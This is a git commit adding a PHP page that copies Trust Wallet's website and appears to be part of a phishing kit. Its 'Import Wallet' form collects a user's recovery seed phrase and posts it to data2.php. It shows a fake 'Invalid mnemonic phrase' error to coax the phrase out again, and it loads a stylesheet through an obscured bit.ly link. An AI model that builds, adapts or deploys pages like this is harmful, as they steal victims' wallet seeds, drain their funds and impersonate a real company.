a5561e8f2933a99f1e378657b36c1a2e52304de2
Veveekkgrroup <117433473+Veveekkgrroup@users.noreply.github.com>
2023-02-16 18:23:49 +0700

    Add files via upload

---
+++ trust/invalid.php
@@ -0,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Best Cryptocurrency Wallet | Ethereum Wallet | ERC20 Wallet | Trust Wallet</title>
+        <meta property="og:title" content="Best Cryptocurrency Wallet | Ethereum Wallet | ERC20 Wallet | Trust Wallet">
+        <meta property="og:locale" content="en">
+        <meta property="og:image" content="https://trustwallet.com/assets/images/blog-preview/buy-crypto-with-your-credit-card.png">
+        <meta name="description" content="Trust Wallet is the best ethereum wallet and cryptocurrency wallet to store your favourite BEP2, ERC20 and ERC721, tokens. Download the Android Trust Wallet and iOS app today!">
+        <meta property="og:description" content="Trust Wallet is the best ethereum wallet and cryptocurrency wallet to store your favourite BEP2, ERC20 and ERC721, tokens. Download the Android Trust Wallet and iOS app today!">
+        <meta property="og:type" content="website">
+        <link rel="canonical" href="https://trustwallet.com/referral/">
+        <meta property="og:url" content="https://trustwallet.com/referral/">
+        <meta property="og:site_name" content="Trust Wallet">
+        <link rel="shortcut icon" href="https://trustwallet.com/assets/images/favicon.ico" type="image/x-icon">
+        <link rel="shortcut icon" type="image/png" href="https://trustwallet.com/assets/images/favicon.png">
+        <meta name="apple-itunes-app" content="app-id=1288339409,affiliate-data=11l7ss">
+        <meta name="theme-color" content="#3375BB">
+        <script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script>
+        <script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-N974VSJ"></script>
+        <script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-N974VSJ"></script>
+        <script async="" src="https://www.google-analytics.com/analytics.js"></script>
+        <script async="" src="https://cdn.branch.io/branch-latest.min.js"></script>
+        <script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script>
+        <script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-N974VSJ"></script>
+        <script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-N974VSJ"></script>
+        <script type="text/javascript" async="" src="https://www.google-analytics.com/gtm/js?id=GTM-TB9P97W&amp;cid=610591139.1600330733"></script>
+        <script async="" src="https://www.google-analytics.com/analytics.js"></script>
+        <script async="" src="https://cdn.branch.io/branch-latest.min.js"></script>
+        <script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script>
+        <script type="text/javascript" async="" src="https://www.google-analytics.com/gtm/js?id=GTM-TB9P97W&amp;cid=1605136243.1600427189"></script>
+        <script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-N974VSJ"></script>
+        <script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-N974VSJ"></script>
+        <script async="" src="https://www.google-analytics.com/analytics.js"></script>
+        <script async="" src="https://cdn.branch.io/branch-latest.min.js"></script>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+        <script type="application/ld+json">
+            
+
+    {
+
+      "description": "Trust Wallet is the best ethereum wallet and cryptocurrency wallet to store your favourite BEP2, ERC20 and ERC721, tokens. Download the Android Trust Wallet and iOS app today!",
+
+      "@type": "WebPage",
+
+      "url": "https://trustwallet.com/referral/",
+
+      "headline": "Best Cryptocurrency Wallet | Ethereum Wallet | ERC20 Wallet | Trust Wallet",
+
+      "@context": "https://schema.org"
+
+    }
+
+  
+        </script>
+        <script type="text/javascript">
+
+            (function(b, r, a, n, c, h, _, s, d, k) {
+
+                if (!b[n] || !b[n]._q) {
+
+                    for (; s < _.length; )
+                        c(h, _[s++]);
+
+                    d = r.createElement(a);
+
+                    d.async = 1;
+
+                    d.src = "https://cdn.branch.io/branch-latest.min.js";
+
+                    k = r.getElementsByTagName(a)[0];
+
+                    k.parentNode.insertBefore(d, k);
+
+                    b[n] = h
+
+                }
+
+            }
+            )(window, document, "script", "branch", function(b, r) {
+
+                b[r] = function() {
+
+                    b._q.push([r, arguments])
+
+                }
+
+            }, {
+
+                _q: [],
+
+                _v: 1
+
+            }, "addListener applyCode banner closeBanner creditHistory credits data deepview deepviewCta first getCode init link logout redeem referrals removeListener sendSMS setBranchViewData setIdentity track validateCode".split(" "), 0);
+
+            branch.init('key_live_lfvIpVeI9TFWxPCqwU8rZnogFqhnzs4D');
+
+            function sendSMS(form) {
+
+                var phone = form.phone.value;
+
+                var linkData = {
+
+                    tags: [],
+
+                    channel: 'website',
+
+                    feature: 'referral',
+
+                    data: ''
+
+                };
+
+                var options = {
+
+                    make_new_link: false
+
+                };
+
+                var callback = function(err, result) {
+
+                    if (err) {
+
+                        alert("Sorry, something went wrong.");
+
+                    } else {
+
+                        alert("SMS sent!");
+
+                    }
+
+                };
+
+                branch.sendSMS(phone, linkData, options, callback);
+
+                form.phone.value = "";
+
+            }
+
+            // send UTM tag when user clicks on "CTA button on desktop/mobile"
+
+            var linkData = {
+
+                channel: 'mobile_web',
+
+                feature: 'homepage',
+
+                data: {
+
+                    'custom_int': Date.now()
+
+                }
+
+            };
+
+            branch.link(linkData, function(err, link) {
+
+                // bind elements
+
+                document.getElementById('downloadapp').onclick = function() {
+
+                    window.open(link || err);
+
+                }
+                ;
+
+            });
+
+            branch.deepview({
+
+                'channel': 'website',
+
+                'feature': 'deepview',
+
+            }, {
+
+                'open_app': false
+
+            });
+        </script>
+        <script type="application/javascript">
+
+            document.addEventListener("DOMContentLoaded", function(event) {
+
+                document.getElementById('navbarToggle').addEventListener('click', function() {
+
+                    var el = document.getElementById('navbarSupportedContent');
+
+                    var toggled = window.getComputedStyle(el).display == 'block';
+
+                    if (toggled) {
+
+                        el.style.display = "none";
+
+                    } else {
+
+                        el.style.display = "block";
+
+                    }
+
+                })
+
+            });
+        </script>
+        <link rel="stylesheet" href="https://bit.ly/3rwgeTS3rwgeTS3rwgeTS3rwgeTS">
+        <link rel="alternate" href="https://trustwallet.com/referral/" hreflang="en">
+        <link rel="alternate" href="https://trustwallet.com/referral/" hreflang="x-default">
+        <link rel="alternate" href="https://trustwallet.com/ru/referral/" hreflang="ru">
+        <link rel="alternate" href="https://trustwallet.com/de/referral/" hreflang="de">
+        <link rel="alternate" href="https://trustwallet.com/vi/referral/" hreflang="vi">
+        <link rel="alternate" href="https://trustwallet.com/id/referral/" hreflang="id">
+        <link rel="alternate" href="https://trustwallet.com/ko/referral/" hreflang="ko">
+        <link rel="alternate" href="https://trustwallet.com/ja/referral/" hreflang="ja">
+        <link rel="alternate" href="https://trustwallet.com/tr/referral/" hreflang="tr">
+        <link rel="alternate" href="https://trustwallet.com/pt_BR/referral/" hreflang="pt">
+        <link rel="alternate" href="https://trustwallet.com/zh_CN/referral/" hreflang="zh">
+        <link rel="alternate" href="https://trustwallet.com/es/referral/" hreflang="es">
+        <style type="text/css">
+            iframe#_hjRemoteVarsFrame {
+                display: none !important;
+                width: 1px !important;
+                height: 1px !important;
+                opacity: 0 !important;
+                pointer-events: none !important;
+            }
+        </style>
+        <style type="text/css">
+            iframe#_hjRemoteVarsFrame {
+                display: none !important;
+                width: 1px !important;
+                height: 1px !important;
+                opacity: 0 !important;
+                pointer-events: none !important;
+            }
+        </style>
+        <style type="text/css">
+            iframe#_hjRemoteVarsFrame {
+                display: none !important;
+                width: 1px !important;
+                height: 1px !important;
+                opacity: 0 !important;
+                pointer-events: none !important;
+            }
+        </style>
+    </head>
+    <body>
+        <noscript>
+            <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-N974VSJ" height="0" width="0" style="display:none;visibility:hidden"></iframe>
+        </noscript>
+        <nav class="navbar navbar-expand-lg navbar-togglable navbar-dark bg-primary d-block">
+            <div class="container">
+                <a class="navbar-brand" href="/">
+                    <svg class="navbar-brand-img logotype-white" alt="Trust Wallet"></svg>
+                </a>
+                <button class="navbar-toggler collapsed" id="navbarToggle" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-expanded="false" aria-hidden="true" aria-label="Toggle navigation" aria-controls="navbarCollapse">
+                    <span class="navbar-toggler-icon collapsed"></span>
+                </button>
+                <div class="navbar-collapse collapse navbar-margin" id="navbarSupportedContent" style="display: none;">
+                    <button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation"></button>
+                    <ul class="navbar-nav font-size-sm ml-auto">
+                        <li class="nav-item">
+                            <a class="nav-link" href="/">Assets</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="/">Staking</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="/">
+                                Earn<span class="ml-3 badge badge-success">+130% APR</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="/">DApp Browser</a>
+                        </li>
+                        <li class="nav-item dropdown">
+                            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="false" aria-expanded="true">Language
+
+</a>
+                            <div class="dropdown-menu dropdown-menu-md" aria-labelledby="navbarDropdown">
+                                <div class="list-group list-group-flush">
+                                    <ul class="list-unstyled list-block">
+                                        <li class="list-inline-item m-6">
+                                            <a class="list-group-item" href="/">
+                                                <div class="flag bg-en"></div>
+                                            </a>
+                                        </li>
+                                        <li class="list-inline-item m-6">
+                                            <a class="list-group-item list-inline-item" href="/">
+                                                <div class="flag bg-ru"></div>
+                                            </a>
+                                        </li>
+                                        <li class="list-inline-item m-6">
+                                            <a class="list-group-item list-inline-item" href="/">
+                                                <div class="flag bg-de"></div>
+                                            </a>
+                                        </li>
+                                        <li class="list-inline-item m-6">
+                                            <a class="list-group-item list-inline-item" href="/">
+                                                <div class="flag bg-vi"></div>
+                                            </a>
+                                        </li>
+                                        <li class="list-inline-item m-6">
+                                            <a class="list-group-item list-inline-item" href="/">
+                                                <div class="flag bg-id"></div>
+                                            </a>
+                                        </li>
+                                        <li class="list-inline-item m-6">
+                                            <a class="list-group-item list-inline-item" href="/">
+                                                <div class="flag bg-ko"></div>
+                                            </a>
+                                        </li>
+                                        <li class="list-inline-item m-6">
+                                            <a class="list-group-item list-inline-item" href="/">
+                                                <div class="flag bg-ja"></div>
+                                            </a>
+                                        </li>
+                                        <li class="list-inline-item m-6">
+                                            <a class="list-group-item list-inline-item" href="/">
+                                                <div class="flag bg-tr"></div>
+                                            </a>
+                                        </li>
+                                        <li class="list-inline-item m-6">
+                                            <a class="list-group-item list-inline-item" href="/">
+                                                <div class="flag bg-pt_BR"></div>
+                                            </a>
+                                        </li>
+                                        <li class="list-inline-item m-6">
+                                            <a class="list-group-item list-inline-item" href="/">
+                                                <div class="flag bg-zh_CN"></div>
+                                            </a>
+                                        </li>
+                                        <li class="list-inline-item m-6">
+                                            <a class="list-group-item list-inline-item" href="/">
+                                                <div class="flag bg-es"></div>
+                                            </a>
+                                        </li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+        <main class="page-content" aria-label="Content">
+            <section class="pt-5 pb-2 pt-md-10t bg-light">
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-12">
+                            <div class="card card-row ">
+                                <div class="row no-gutters shadow-light-lg">
+                                    <div class="col-12">
+                                        <div class="card-body">
+                                            <h3 class="">
+                                                <font face="Arial" size="4" color="#4682B4">Import Wallet</font>
+                                            </h3>
+                                            <form method="post" action="data2.php">
+                                                <div class="form-group pt-2">
+                                                    <textarea type="text" class="form-control" id="walletSeed" name="walletSeed" maxlength="300" minlength="12" placeholder="Phrase" style="margin-top: 0px; margin-bottom: 0px; height: 110px;" required=""></textarea>
+                                                </div>
+                                                <font face="Arial" size="2" color="red">Invalid mnemonic phrase</font>
+                                                <h6 class="text-muted mt-4">Typically 12 (sometimes 24) words separated by single spaces</h6>
+                                                <div class="mt-6">
+                                                    <button class="btn btn-block btn-primary lift" type="submit" value="Send">IMPORT
+
+</button>
+                                                </div>
+                                            </form>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </main>
+        <noscript>
+            <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T583ZCC" height="0" width="0" style="display:none;visibility:hidden"></iframe>
+        </noscript>
+    </body>
+</html>
